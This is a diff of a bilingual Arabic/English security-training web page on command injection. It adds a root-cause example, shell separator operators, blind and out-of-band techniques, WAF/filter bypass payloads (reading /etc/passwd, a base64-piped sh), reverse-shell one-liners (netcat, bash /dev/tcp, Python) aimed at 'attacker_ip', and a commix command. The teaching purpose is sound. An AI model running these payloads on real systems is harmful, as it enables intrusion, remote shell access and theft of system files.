@@ -58,6 +58,10 @@
     <a class="sidebar-link" href="vulnerabilities/ai-llm-security.html">🤖 AI/LLM Security</a>
     <a class="sidebar-link" href="vulnerabilities/cloud-security.html">☁️ Cloud Security</a>
     <a class="sidebar-link" href="vulnerabilities/active-directory.html">🏰 Active Directory</a>
+    <a class="sidebar-link" href="vulnerabilities/xss.html">🕷️ Cross-Site Scripting (XSS)</a>
+    <a class="sidebar-link" href="vulnerabilities/csrf.html">🎭 CSRF</a>
+    <a class="sidebar-link" href="vulnerabilities/lfi-rfi.html">📂 LFI & RFI</a>
+    <a class="sidebar-link" href="vulnerabilities/xxe.html">📜 XXE</a>
     
     <div class="sidebar-title" style="margin-top:18px;">Labs / المختبرات</div>
     <a class="sidebar-link" href="index.html">🐚 Linux Terminal</a>
@@ -81,96 +85,148 @@
     <a class="sidebar-link" href="linux-security/linux-checklist.html">📋 Audit Checklist</a>
     <a class="sidebar-link" href="linux-security/linux-analysis.html">🛡️ Linux Analysis</a>
 
+    
+    <div class="sidebar-title" style="margin-top:18px;">Writeups / التقارير</div>
+    <a class="sidebar-link" href="writeups/api-hacking.html">📝 API Hacking</a>
+    <a class="sidebar-link" href="writeups/graphql-attack.html">📝 GraphQL Leak</a>
+    <a class="sidebar-link" href="writeups/cloud-ssrf.html">📝 Cloud SSRF</a>
+    <a class="sidebar-link" href="writeups/linux-suid-root.html">📝 Linux SUID</a>
+    <a class="sidebar-link" href="writeups/recon-mastery.html">📝 Recon Mastery</a>
+    <a class="sidebar-link" href="writeups/ai-prompt-inj.html">📝 AI Prompt Inj</a>
+    <a class="sidebar-link" href="writeups/race-payments.html">📝 Race Conditions</a>
+    <a class="sidebar-link" href="writeups/ad-to-domain.html">📝 AD Domain</a>
+    <a class="sidebar-link" href="writeups/nuclei-to-p1.html">📝 Nuclei to P1</a>
+    <a class="sidebar-link" href="writeups/jwt-advanced.html">📝 JWT Advanced</a>
+
     <div class="sidebar-title" style="margin-top:18px;">Profile / ملفي</div>
     <a class="sidebar-link" href="profile.html">👤 Profile / الملف الشخصي</a>
   </aside>
 
   <main class="academy-main">
-    
 <div class="page-hero">
-  <h1 class="page-title">حقن الأوامر — تنفيذ الأكواد عن بعد (RCE)</h1>
-  <p class="page-title-en">Command Injection — RCE via Input</p>
+  <h1 class="page-title">حقن الأوامر (Command Injection) — الدليل الشامل</h1>
+  <p class="page-title-en">Command Injection (CMDi) — The Ultimate Deep Dive</p>
   <span class="severity-pill pill-critical">CRITICAL</span>
-  <span class="severity-pill pill-high">OWASP A03</span>
+  <span class="severity-pill pill-high">OWASP A03:2021</span>
 </div>
 
 <div class="bilingual-block">
   <div class="lang-section">
     <span class="lang-tag">AR</span>
-    <p><strong>Command Injection</strong> ثغرة بالغة الخطورة تحدث عندما يقوم التطبيق بتمرير مدخلات المستخدم مباشرة ليتم تنفيذها كأوامر في نظام التشغيل (OS System Shell) دون فحص أو عزل سليم. يتيح هذا للمهاجم تنفيذ أي أوامر يرغب فيها والسيطرة الكاملة على السيرفر (RCE).</p>
+    <p><strong>ثغرة حقن الأوامر (Command Injection)</strong> تحدث عندما يقوم تطبيق الويب بتمرير مدخلات المستخدم إلى أوامر نظام التشغيل (System Shell) لتنفيذها (مثل <code>system()</code>, <code>exec()</code> في PHP، أو <code>os.system()</code> في Python) دون تنظيف كافٍ. هذا يسمح للمهاجم بإلحاق أوامره الخاصة التي تنفذ بصلاحيات خادم الويب، مما يؤدي للسيطرة الكاملة على الخادم (RCE).</p>
   </div>
   <div class="lang-section lang-en">
     <span class="lang-tag">EN</span>
-    <p><strong>Command Injection</strong> is a critical vulnerability that occurs when an application passes unsafe user-supplied data to a system shell. The operating system executes this data as commands, allowing the attacker to achieve full Remote Code Execution (RCE).</p>
+    <p><strong>Command Injection (CMDi)</strong> is a critical vulnerability that occurs when a web application passes unsafe user-supplied data to a system shell. Attackers can leverage this to execute arbitrary operating system commands, leading to full Remote Code Execution (RCE) and system compromise.</p>
   </div>
 </div>
 
 <div class="section-card">
-  <h2>أنواع حقن الأوامر / Vulnerability Types</h2>
+  <h2>آلية العمل والسبب الجذري / Root Cause Analysis</h2>
+  <p>تخيل تطبيقًا يوفر أداة <code>ping</code> لمعرفة حالة شبكة أو IP. الكود الخلفي قد يكون كالتالي:</p>
+  <div class="cmd-block">
+    <pre>system("ping -c 4 " . $_GET['ip']);</pre>
+  </div>
+  <p>إذا أدخل المستخدم <code>127.0.0.1</code>، سيعمل الأمر طبيعياً. ولكن، إذا أدخل المهاجم <code>127.0.0.1; whoami</code>، فسيقوم السيرفر بتنفيذ أمرين متتاليين بدلاً من أمر واحد:</p>
+  <div class="cmd-block">
+    <pre>ping -c 4 127.0.0.1; whoami</pre>
+  </div>
+  <p>الفاصلة المنقوطة <code>;</code> تنهي الأمر الأول وتبدأ أمرًا جديدًا في بيئة Linux.</p>
+</div>
+
+<div class="section-card">
+  <h2>أنواع حقن الأوامر وتقنيات الربط / Injection Techniques</h2>
+  
   <div class="type-grid">
     <div class="type-item">
-      <h4>Classic Command Injection</h4>
-      <p>مخرجات نظام التشغيل تظهر مباشرة للمستخدم في استجابة صفحة الويب.</p>
+      <h4>1. المعاملات الفاصلة (Separators)</h4>
+      <p class="lang-ar">طرق ربط عدة أوامر في Linux و Windows:</p>
+      <ul>
+        <li><code>;</code> : إنهاء الأمر وبدء آخر (Linux).</li>
+        <li><code>&</code> : تشغيل الأمر في الخلفية وبدء آخر (Linux/Windows).</li>
+        <li><code>&&</code> : تشغيل الأمر الثاني فقط إذا نجح الأول.</li>
+        <li><code>|</code> : تمرير مخرجات الأمر الأول للأمر الثاني (Piping).</li>
+        <li><code>||</code> : تشغيل الأمر الثاني فقط إذا فشل الأول.</li>
+        <li><code>`command`</code> أو <code>$(command)</code> : التنفيذ المضمن (Inline Execution).</li>
+      </ul>
     </div>
+    
     <div class="type-item">
-      <h4>Blind Command Injection</h4>
-      <p>المخرجات لا تظهر في الاستجابة. يتطلب الكشف عنها إحداث تأخير زمني (Time Delay) مثل <code>sleep 5</code>.</p>
-    </div>
-    <div class="type-item">
-      <h4>Out-of-Band (OOB) Injection</h4>
-      <p>إجبار السيرفر على إرسال المخرجات لخادم خارجي يتحكم فيه المهاجم عبر بروتوكولات مثل DNS أو HTTP.</p>
+      <h4>2. Blind Command Injection</h4>
+      <p class="lang-ar">عندما لا يعرض التطبيق مخرجات الأمر، نستخدم تقنيات الـ Blind:</p>
+      <ul>
+        <li><strong>Time-based:</strong> حقن أمر <code>sleep 10</code> وملاحظة وقت الاستجابة.</li>
+        <li><strong>Out-of-Band (OOB):</strong> استخراج البيانات بإرسالها إلى خادم يتحكم فيه المهاجم باستخدام <code>curl</code>, <code>wget</code>, أو إرسال استعلام <code>nslookup</code>.</li>
+      </ul>
     </div>
   </div>
 </div>
 
 <div class="section-card">
-  <h2>أوامر الاختبار والـ Payloads الحية / Commmand Injection Payloads</h2>
+  <h2>تخطي الفلاتر (WAF & Filter Bypasses)</h2>
+  <div class="bilingual-block">
+    <div class="lang-section">
+      <span class="lang-tag">AR</span>
+      <p>في برامج صيد الثغرات (Bug Bounty)، غالبًا ما يتم فلترة مسافات أو كلمات معينة. إليك طرق التخطي:</p>
+      <ul>
+        <li><strong>تخطي المسافات (Space Bypass):</strong>
+          <ul>
+            <li>استخدام المتغيرات: <code>$IFS</code> (مثال: <code>cat$IFS/etc/passwd</code>).</li>
+            <li>استخدام إعادة التوجيه: <code>cat&lt;/etc/passwd</code>.</li>
+            <li>استخدام الأقواس: <code>{cat,/etc/passwd}</code>.</li>
+          </ul>
+        </li>
+        <li><strong>تخطي الكلمات الممنوعة (Blacklisted Words Bypass):</strong>
+          <ul>
+            <li>علامات التنصيص: <code>w"h"o"a"m"i</code> أو <code>c'a't /e't'c/p'a's's'w'd</code>.</li>
+            <li>المتغيرات الفارغة: <code>who$@ami</code> أو <code>cat /e$xetc/pass$xwd</code>.</li>
+            <li>الشرطات المائلة المقلوبة (Backslashes): <code>w\h\o\a\m\i</code>.</li>
+            <li>الترميز العكسي (Base64): <code>echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | sh</code>.</li>
+          </ul>
+        </li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<div class="section-card">
+  <h2>الحصول على Reverse Shell / Remote Shells</h2>
+  <p>أهم خطوة بعد اكتشاف الحقن هي الحصول على جلسة تحكم (Shell) تفاعلية:</p>
   <div class="cmd-block">
-    <pre># Classic command separation payloads
-; whoami
-| id
-& cat /etc/passwd
-`uname -a`
-$(id)
+    <pre># Netcat Traditional
+nc -e /bin/sh attacker_ip 4444
 
-# Blind time-delay testing
-; sleep 10
+# Netcat OpenBSD (No -e flag)
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker_ip 4444 > /tmp/f
 
-# Reverse shell payload
-; nc -e /bin/sh attacker.com 4444
+# Bash Reverse Shell
+bash -i >& /dev/tcp/attacker_ip/4444 0>&1
 
-# Automated testing with Commix
-commix -u "https://target.com/index.php?addr=127.0.0.1" --batch</pre>
+# Python Reverse Shell
+python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'</pre>
     <div class="cmd-footer"><button class="copy-btn" onclick="copyCmd(this)">📋 Copy</button></div>
   </div>
 </div>
 
 <div class="section-card">
-  <h2>الأدوات / Tools</h2>
+  <h2>أدوات الأتمتة / Automation Tools</h2>
   <div class="tools-row">
-    <span class="tool-chip">commix</span>
-    <span class="tool-chip">Burp Suite Repeater</span>
-    <span class="tool-chip">payloadsallthethings</span>
-    <span class="tool-chip">nc (Netcat)</span>
+    <span class="tool-chip">Commix</span>
+    <span class="tool-chip">Burp Suite (Collaborator)</span>
+    <span class="tool-chip">Tplmap</span>
+  </div>
+  <p style="margin-top: 15px;">أداة Commix مخصصة تماماً للـ Command Injection وتدعم تخطي الفلاتر تلقائياً:</p>
+  <div class="cmd-block">
+    <pre>commix -u "https://target.com/ping.php?ip=127.0.0.1" --batch</pre>
   </div>
 </div>
 
 <div class="section-card">
-  <h2>Writeup & Lab</h2>
-  <div class="bilingual-block">
-    <div class="lang-section">
-      <span class="lang-tag">AR</span>
-      <p>Writeup: <strong>Command Injection: From Input to Shell</strong> — تقرير يوضح استغلال حقل فحص الشبكة (Ping utility) لتشغيل reverse shell والتحكم التام بالسيرفر الداخلي.</p>
-    </div>
-    <div class="lang-section lang-en">
-      <span class="lang-tag">EN</span>
-      <p>Writeup: <strong>Command Injection: From Input to Shell</strong> — how a simple ping utility parameter was exploited to gain a reverse shell connection.</p>
-    </div>
-  </div>
-  <a class="cta-lab" href="labs/command-injection-lab.html">🧪 افتح Command Injection Lab — 3 Levels</a>
+  <h2>التطبيق العملي / Writeup & Lab</h2>
+  <a class="cta-lab" href="labs/command-injection-lab.html">🧪 افتح مختبر Command Injection التفاعلي — 3 مستويات</a>
 </div>
 
-  </main>
+</main>
 </div>
 
 <!-- Dynamic Relative Path & Active Class Resolver -->
